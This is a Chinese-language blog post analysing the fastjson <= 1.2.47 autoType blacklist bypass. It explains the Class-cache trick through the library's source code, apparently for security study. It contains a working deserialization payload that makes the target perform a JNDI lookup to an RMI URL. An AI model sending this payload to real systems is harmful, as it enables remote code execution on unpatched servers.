<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
Fastjson <= 1.2.47 POC
随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。
我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。
import com.alibaba.fastjson.JSON;

public class Eval3 {

    public static void main(String[] args) throws Exception {
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}";
        JSON.parse(payload);
    }
}
不出意料的话会出现这样的错误提示信息：
autoType is not support. com.sun.rowset.JdbcRowSetImpl
这是因为 fastjson 使用了黑名单机制，禁止将 com.sun.rowset.JdbcRowSetImpl 反序列化。
下面我们使用新的 POC 进行测试，又可以利用成功了。
import com.alibaba.fastjson.JSON;

public class Eval5 {

    public static void main(String[] args) throws Exception {
        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}";
        JSON.parse(payload);
    }
}
payload 格式化之后如下：
{
	"a": {
		"@type": "java.lang.Class",
		"val": "com.sun.rowset.JdbcRowSetImpl"
	},
	"b": {
		"@type": "com.sun.rowset.JdbcRowSetImpl",
		"dataSourceName": "rmi://localhost:1099/Exploit",
		"autoCommit": true
	}
}
Fastjson <= 1.2.47 绕过原理
在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。'><title>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.51652302d3a998bf7887aed5c2cf89141bbebdf45a2c8f87b0717a3cf4f51c4e53c694c328fb1de78c3a625a1c01f80745bf1f2f42c040647a245cbbb6c2d1d7.css integrity="sha512-UWUjAtOpmL94h67Vws+JFBu+vfRaLI+HsHF6PPT1HE5TxpTDKPsd54w6YlocAfgHRb8fL0LAQGR6JFy7tsLR1w=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-10-31 21:31:00 +0800 +0800">2021-10-31</time></p></div><article><h1>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=fastjson--1247-poc>Fastjson &lt;= 1.2.47 POC</h2><p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。</p><p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval3</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        String payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/Exploit\&#34;,\&#34;autoCommit\&#34;:true}&#34;</span>;
</span></span><span style=display:flex><span>        JSON.<span style=color:#a6e22e>parse</span>(payload);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>不出意料的话会出现这样的错误提示信息：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
</span></span></code></pre></div><p>这是因为 fastjson 使用了黑名单机制，禁止将 <code>com.sun.rowset.JdbcRowSetImpl</code> 反序列化。</p><p>下面我们使用新的 POC 进行测试，又可以利用成功了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> com.alibaba.fastjson.JSON;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval5</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        String payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{\&#34;a\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;},\&#34;b\&#34;:{\&#34;@type\&#34;:\&#34;com.sun.rowset.JdbcRowSetImpl\&#34;,\&#34;dataSourceName\&#34;:\&#34;rmi://localhost:1099/Exploit\&#34;,\&#34;autoCommit\&#34;:true}}&#34;</span>;
</span></span><span style=display:flex><span>        JSON.<span style=color:#a6e22e>parse</span>(payload);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>payload 格式化之后如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;a&#34;</span>: {
</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;@type&#34;</span>: <span style=color:#e6db74>&#34;java.lang.Class&#34;</span>,
</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;val&#34;</span>: <span style=color:#e6db74>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style=display:flex><span>	},
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;b&#34;</span>: {
</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;@type&#34;</span>: <span style=color:#e6db74>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;dataSourceName&#34;</span>: <span style=color:#e6db74>&#34;rmi://localhost:1099/Exploit&#34;</span>,
</span></span><span style=display:flex><span>		<span style=color:#e6db74>&#34;autoCommit&#34;</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=fastjson--1247-绕过原理>Fastjson &lt;= 1.2.47 绕过原理</h2><p>在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。</p><p><img src="https://oss.typesafe.cn/fastjson.png?t=2" alt=image></p><p>上面我们已经发现用上一节构造的 payload 已经无法通过，就是因为在调用 <code>ParserConfig.checkAutoType</code> 返回的。</p><p>安全人员通过审计源码发现，当JSON对象的类型是<code>java.lang.Class</code>，并且存在 <strong>val</strong> 字段时，fastjson 会将其解析转换得到字符串（完整包名），并将 <strong>val</strong> 对应的类加载到缓存中，而 <code>checkAutoType</code> 方法中，如果从缓存中获取到了 Class 就会直接返回，不会再进行下面的黑名单校验。</p><p>以我们构造的 payload 为例，首先会解析</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;@type&#34;</span>: <span style=color:#e6db74>&#34;java.lang.Class&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;val&#34;</span>: <span style=color:#e6db74>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>因为 <code>@type</code> 是 <code>java.lang.Class</code> 所以通过了 <code>checkAutoType</code> 校验，进入 <code>com.alibaba.fastjson.serializer.MiscCodec</code> 的 <code>deserialze</code> 方法，下面是 <code>deserialze</code> 方法的部分代码。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>deserialze</span>(DefaultJSONParser parser, Type clazz, Object fieldName) {
</span></span><span style=display:flex><span>    JSONLexer lexer <span style=color:#f92672>=</span> parser.<span style=color:#a6e22e>lexer</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 代码省略</span>
</span></span><span style=display:flex><span>    Object objVal;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (parser.<span style=color:#a6e22e>resolveStatus</span> <span style=color:#f92672>==</span> DefaultJSONParser.<span style=color:#a6e22e>TypeNameRedirect</span>) {
</span></span><span style=display:flex><span>        parser.<span style=color:#a6e22e>resolveStatus</span> <span style=color:#f92672>=</span> DefaultJSONParser.<span style=color:#a6e22e>NONE</span>;
</span></span><span style=display:flex><span>        parser.<span style=color:#a6e22e>accept</span>(JSONToken.<span style=color:#a6e22e>COMMA</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (lexer.<span style=color:#a6e22e>token</span>() <span style=color:#f92672>==</span> JSONToken.<span style=color:#a6e22e>LITERAL_STRING</span>) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#e6db74>&#34;val&#34;</span>.<span style=color:#a6e22e>equals</span>(lexer.<span style=color:#a6e22e>stringVal</span>())) {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;syntax error&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            lexer.<span style=color:#a6e22e>nextToken</span>();
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> JSONException(<span style=color:#e6db74>&#34;syntax error&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        parser.<span style=color:#a6e22e>accept</span>(JSONToken.<span style=color:#a6e22e>COLON</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 解析 val 字段</span>
</span></span><span style=display:flex><span>        objVal <span style=color:#f92672>=</span> parser.<span style=color:#a6e22e>parse</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        parser.<span style=color:#a6e22e>accept</span>(JSONToken.<span style=color:#a6e22e>RBRACE</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        objVal <span style=color:#f92672>=</span> parser.<span style=color:#a6e22e>parse</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    String strVal;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (objVal <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>        strVal <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (objVal <span style=color:#66d9ef>instanceof</span> String) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 转换为 String 类型</span>
</span></span><span style=display:flex><span>        strVal <span style=color:#f92672>=</span> (String) objVal;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 代码忽略</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 代码省略</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 这个 clazz 是我们在 @type 中指定的类型，因此是满足这个条件的</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (clazz <span style=color:#f92672>==</span> Class.<span style=color:#a6e22e>class</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (T) TypeUtils.<span style=color:#a6e22e>loadClass</span>(strVal, parser.<span style=color:#a6e22e>getConfig</span>().<span style=color:#a6e22e>getDefaultClassLoader</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// 代码省略</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>而 <code>com.alibaba.fastjson.util.TypeUtils.java</code> 最终调用的方法如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Class<span style=color:#f92672>&lt;?&gt;</span> loadClass(String className, ClassLoader classLoader) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> loadClass(className, classLoader, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可以看到 <code>cache</code> 参数是 <code>true</code>。</p><pre tabindex=0><code>public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
        // 代码忽略
        try{
            if(classLoader != null){
                clazz = classLoader.loadClass(className);
                if (cache) {
                    // 这里缓存了 com.sun.rowset.JdbcRowSetImpl 到 mappings 中
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            e.printStackTrace();
            // skip
        }
        try{
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
            if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
                clazz = contextClassLoader.loadClass(className);
                if (cache) {
                    // 这里缓存了 com.sun.rowset.JdbcRowSetImpl 到 mappings 中
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            // skip
        }
        try{
            clazz = Class.forName(className);
            mappings.put(className, clazz);
            return clazz;
        } catch(Throwable e){
            // skip
        }
        return clazz;
    }
</code></pre><p>解析完第一个JSON对象后，开始解析第二个JSON对象。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;@type&#34;</span>: <span style=color:#e6db74>&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;dataSourceName&#34;</span>: <span style=color:#e6db74>&#34;rmi://localhost:1099/Exploit&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#f92672>&#34;autoCommit&#34;</span>: <span style=color:#66d9ef>true</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>我们直接看 <code>com.alibaba.fastjson.parser.ParseConfig.checkAutoType</code> 的代码:</p><pre tabindex=0><code>public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
    // 代码忽略 ...

    if (clazz == null) {
        // 这里从 mapping 中通过类名称获取类，因为在处理第一个JSON对象的时候已经把 com.sun.rowset.JdbcRowSetImpl put 进去了，因此这里一定是可以获取到 Class 的
        clazz = TypeUtils.getClassFromMapping(typeName);
    }
    
    // 不会进入这个判断
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }

    // 进入这个判断
    if (clazz != null) {
        // 根据参数调用得出 expectClass 是 null，也不会进入这个判断
        if (expectClass != null
                &amp;&amp; clazz != java.util.HashMap.class
                &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException(&#34;type not match. &#34; + typeName + &#34; -&gt; &#34; + expectClass.getName());
        }
        // 直接返回 Class
        return clazz;
    }

    // 代码省略，下面的黑名单判断已经不重要了
    return clazz;
}
</code></pre><p>可以看到在缓存中获取到 Class 对象后直接 return 出去了，下面的黑名单校验并没有进行，之后的逻辑就是构造实例，发出 JNDI 请求，在此不再赘述了。</p></article></div></main></body></html>